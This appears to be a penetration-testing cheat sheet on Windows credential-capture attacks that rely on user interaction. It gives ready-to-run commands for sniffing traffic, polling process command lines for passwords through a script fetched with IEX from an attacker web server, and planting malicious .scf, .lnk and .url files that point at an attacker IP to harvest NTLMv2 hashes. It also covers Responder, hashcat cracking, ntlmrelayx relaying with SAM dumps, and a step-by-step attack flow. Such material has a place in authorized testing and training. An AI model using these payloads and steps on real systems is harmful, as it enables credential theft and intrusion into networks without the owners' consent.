## Interacting with Users

When all local privilege escalation vectors are exhausted, you can shift to passive or active user-interaction attacks. The core idea is that users browsing file shares, running scheduled tasks, or authenticating to services will inadvertently leak credentials that you can capture and crack or relay. 

***

## Traffic Capture

```powershell
# Check if Wireshark/Npcap is installed (default allows unprivileged capture)
Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Where-Object {$_.DisplayName -like "*Wireshark*" -or $_.DisplayName -like "*npcap*"}

# If Wireshark is installed, launch and capture on the active interface
# Look for: FTP, HTTP, SMTP, Telnet, LDAP traffic (all plaintext)
```

```bash
# On attack machine with placement inside the network
# net-creds - sniffs credentials from live interface or pcap
sudo python net-creds.py -i eth0

# tcpdump - capture to pcap for later analysis
sudo tcpdump -i eth0 -w capture.pcap

# Filter specifically for credential-bearing protocols
sudo tcpdump -i eth0 port 21 or port 23 or port 110 or port 143 or port 80 -w creds.pcap
```

***

## Process Command Line Monitoring

Scheduled tasks, admin scripts, and remote management tools frequently pass credentials directly on the command line. This polling script detects new processes before they terminate: 

```powershell
# Drop on target and run in background, or IEX from attack machine
while ($true) {
    $process  = Get-WmiObject Win32_Process | Select-Object CommandLine
    Start-Sleep 1
    $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
    Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

```powershell
# Execute from attack machine (host procmon.ps1 on HTTP server first)
IEX (iwr 'http://10.10.14.3:8080/procmon.ps1')

# A hit looks like this in the output:
# net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd    =>
# net use and wevtutil /p: flags are the most common password-in-cmdline culprits
```

```powershell
# More targeted - watch for specific keywords in command lines only
while ($true) {
    Get-WmiObject Win32_Process |
        Select-Object CommandLine |
        Where-Object {$_.CommandLine -match "password|passwd|/p:|/pass|/u:|credential"} |
        ForEach-Object { Write-Host "[HIT] $($_.CommandLine)" -ForegroundColor Red }
    Start-Sleep 2
}
```

***

## SCF File Share Attack

When a `.scf` file is placed in a file share, Windows Explorer automatically processes it when a user browses the directory, triggering an SMB authentication attempt to whatever UNC path the IconFile points to. This captures the user's NTLMv2 hash with zero user clicks. 

### Creating the Malicious SCF File

```
Create a file named exactly: @Inventory.scf
(@ forces it to sort to the top of the directory - seen immediately on browse)

File contents:
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# Find a writable share to drop it into
smbmap -H 10.129.43.30 -u username -p password
# Look for: WRITE or READ,WRITE access

# Or enumerate from Windows
net view \\FILE01 /all
icacls "\\FILE01\DepartmentShares\Public"

# Drop the SCF file into the writable share
# From Linux:
smbclient \\\\10.129.43.30\\DepartmentShares -U username
smb: \> cd Public
smb: \> put @Inventory.scf
```

### Starting Responder on Attack Machine

```bash
sudo responder -wrf -v -I tun0

# Flags:
# -w  = WPAD proxy server
# -r  = answer to NetBIOS wredir suffix queries
# -f  = fingerprint remote hosts
# -v  = verbose
# -I  = interface

# When a user browses the share you get:
# [SMB] NTLMv2-SSP Client   : 10.129.43.30
# [SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
# [SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:...

# Hashes saved automatically to:
ls /usr/share/responder/logs/
```

### Cracking the Captured NTLMv2 Hash

```bash
# Copy hash from Responder output or logs to a file called hash.txt
# Hashcat mode 5600 = NetNTLMv2

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper alternative
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Cracked output looks like:
# ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:...:Welcome1
```

### SMB Relay Instead of Cracking

```bash
# If SMB signing is disabled on target machines, relay the hash directly instead of cracking
# Edit Responder config to turn off SMB and HTTP servers (avoid capturing, just relay)
sudo nano /usr/share/responder/Responder.conf
# Set SMB = Off, HTTP = Off

# Run ntlmrelayx to relay captured auth to another host
impacket-ntlmrelayx -tf targets.txt -smb2support
# Captures NTLM, relays to targets.txt hosts, dumps SAM database automatically

# Combine with Responder to capture and relay simultaneously
sudo responder -I tun0 -rdwv
```

***

## Malicious .lnk File (Server 2019+ Replacement for SCF)

SCF files no longer trigger automatic authentication on Windows Server 2019 and newer. The `.lnk` approach achieves the same NTLMv2 capture and still affects all modern Windows versions. 

```powershell
# Generate malicious .lnk on any Windows machine
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\@Inventory.lnk")
$lnk.TargetPath   = "\\10.10.14.3\@pwn.png"   # UNC path to attacker machine
$lnk.WindowStyle  = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description  = "Shared inventory list"
$lnk.HotKey       = "Ctrl+Alt+O"
$lnk.Save()
```

```bash
# Alternative: generate with lnkbomb on Linux
git clone https://github.com/dievus/lnkbomb
python3 lnkbomb.py -s 10.10.14.3 -f @Inventory -r windows

# Drop file into writable share using smbclient
smbclient \\\\10.129.43.30\\DepartmentShares -U username
smb: \> put @Inventory.lnk
```

Note: CVE-2025-50154 and CVE-2025-59214 demonstrate that `.lnk`-based NTLM hash disclosure continues to bypass patches even on fully updated Windows 11 and Server 2025 systems, making this a durable technique. 

***

## Choosing the Right File Type per OS Version

| Target OS | Best File Type | Trigger |
|---|---|---|
| Windows 7 / Server 2008 | `.scf` | User browses folder |
| Windows 10 / Server 2016 | `.scf` or `.lnk` | User browses folder |
| Windows Server 2019+ | `.lnk` | User browses folder |
| All versions | `.url` (Internet Shortcut) | User browses folder |
| All versions | `.library-ms` | User browses folder |

```
# .url file - another option that works broadly
[InternetShortcut]
URL=file://10.10.14.3/share/whatever
WorkingDirectory=whatever
IconFile=\\10.10.14.3\share\legit.ico
IconIndex=1
```

***

## Full Attack Flow

```
1. Find a writable share
   smbmap -H <target> -u <user> -p <pass>
         |
         v
2. Determine target OS version (affects file type choice)
   nmap -sV <target> or net config workstation
         |
         v
3. Create malicious file and drop it
   Server 2019+  -> .lnk via PowerShell or lnkbomb
   Older / mixed -> .scf with @prefix for top-of-dir positioning
         |
         v
4. Start Responder on attack machine
   sudo responder -wrf -v -I tun0
         |
         v
5. Wait for user to browse the share (2-10 minutes in active environments)
         |
         v
6. Capture NTLMv2 hash from Responder output
         |
         v
7a. Offline crack: hashcat -m 5600 hash.txt rockyou.txt
         |
    Use cracked cleartext to: RDP, SSH, SMB, WinRM, runas
         |
7b. Online relay (if SMB signing disabled on targets):
    ntlmrelayx -tf targets.txt -smb2support
         |
    SAM dump or command execution on relay target
```
